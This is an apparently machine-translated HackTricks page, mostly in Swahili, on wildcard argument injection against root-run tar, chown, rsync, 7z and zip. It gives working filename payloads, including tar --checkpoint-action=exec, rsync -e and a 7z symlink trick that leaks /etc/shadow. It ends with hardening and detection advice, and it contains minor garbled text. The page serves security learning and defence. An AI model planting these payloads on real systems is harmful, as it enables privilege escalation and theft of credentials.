# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (pia inajulikana kama *glob*) **kuingiza hoja** hutokea wakati skripti yenye mamlaka inapoendesha binary ya Unix kama `tar`, `chown`, `rsync`, `zip`, `7z`, … kwa kutumia wildcard isiyo na nukuu kama `*`.
> Kwa sababu shell inapanua wildcard **kabla** ya kutekeleza binary, mshambuliaji ambaye anaweza kuunda faili katika directory ya kazi anaweza kuunda majina ya faili yanayoanza na `-` ili yaweze kutafsiriwa kama **chaguzi badala ya data**, kwa ufanisi akisafirisha bendera za kiholela au hata amri.
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na ugunduzi wa kisasa kwa mwaka 2023-2025.

## chown / chmod

Unaweza **kunakili mmiliki/kikundi au bits za ruhusa za faili yoyote** kwa kutumia bendera `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wakati root baadaye anatekeleza kitu kama:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` imeingizwa, ikisababisha *faili zote* zinazolingana kurithi umiliki/ruhusa za `/root/secret``file`.

*PoC & chombo*: [`wildpwn`](https://github.com/localh0t/wildpwn) (shambulio lililounganishwa). 
Tazama pia karatasi ya jadi ya DefenseCode kwa maelezo.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Teua amri za kiholela kwa kutumia kipengele cha **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Mara tu root anapokimbia e.g. `tar -czf /root/backup.tgz *`, `shell.sh` inatekelezwa kama root.

### bsdtar / macOS 14+

`tar` ya kawaida kwenye macOS za hivi karibuni (zinazoegemea `libarchive`) *haitekelezi* `--checkpoint`, lakini bado unaweza kufikia utekelezaji wa msimbo kwa kutumia bendera **--use-compress-program** ambayo inakuwezesha kubaini compressor ya nje.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wakati skripti yenye mamlaka inapoendesha `tar -cf backup.tar *`, `/bin/sh` itaanzishwa.

---

## rsync

`rsync` inakuwezesha kubadilisha shell ya mbali au hata binary ya mbali kupitia bendera za amri zinazaanza na `-e` au `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ikiwa root baadaye anahifadhi saraka hiyo kwa `rsync -az * backup:/srv/`, bendera iliyoingizwa inazalisha shell yako upande wa mbali.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata wakati skripti yenye mamlaka *inajihifadhi* kwa kuweka awali wildcard na `--` (kuzuia uchambuzi wa chaguo), muundo wa 7-Zip unasaidia **faili za orodha za faili** kwa kuweka awali jina la faili na `@`. Kuunganisha hiyo na symlink kunakuwezesha *kuhamasisha faili za kiholela*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ikiwa root anatekeleza kitu kama:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na itakataa, **ikiandika maudhui kwenye stderr**.

---

## zip

`zip` inasaidia bendera `--unzip-command` ambayo inapitishwa *kama ilivyo* kwa shell ya mfumo wakati archive itajaribiwa:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Orodha ya ziada ya binaries zinazoweza kuathiriwa na wildcard injection (orodha ya haraka ya 2023-2025)

Amri zifuatazo zimekuwa zikitumika vibaya katika CTFs za kisasa na mazingira halisi. Payload kila wakati huundwa kama *filename* ndani ya directory inayoweza kuandikwa ambayo baadaye itashughulikiwa kwa wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Soma maudhui ya faili |
| `flock` | `-c <cmd>` | Tekeleza amri |
| `git`   | `-c core.sshCommand=<cmd>` | Utekelezaji wa amri kupitia git juu ya SSH |
| `scp`   | `-S <cmd>` | Anzisha programu isiyo ya kawaida badala ya ssh |

Hizi primitives ni za kawaida kidogo kuliko *tar/rsync/zip* classics lakini zina thamani ya kuangaliwa unapofanya uwindaji.

---

## Ugunduzi & Uimarishaji

1. **Zima shell globbing** katika scripts muhimu: `set -f` (`set -o noglob`) inazuia upanuzi wa wildcard.
2. **Nukuu au kimbia** hoja: `tar -czf "$dst" -- *` si *salama* — pendelea `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Njia wazi**: Tumia `/var/www/html/*.log` badala ya `*` ili wahalifu wasiweze kuunda faili za ndugu zinazoh开始 na `-`.
4. **Haki ndogo**: Endesha kazi za backup/maintenance kama akaunti ya huduma isiyo na haki badala ya root inapowezekana.
5. **Ufuatiliaji**: Kanuni iliyojengwa awali ya Elastic *Potential Shell via Wildcard Injection* inatafuta `tar --checkpoint=*`, `rsync -e*`, au `zip --unzip-command` mara moja ikifuatwa na mchakato wa mtoto wa shell. Uchunguzi wa EQL unaweza kubadilishwa kwa EDR zingine.

---

## Marejeleo

* Elastic Security – Kanuni ya Potenshiali Shell kupitia Wildcard Injection Imegundulika (imepitiwa mara ya mwisho 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (Desemba 18 2024)

{{#include ../../banners/hacktricks-training.md}}
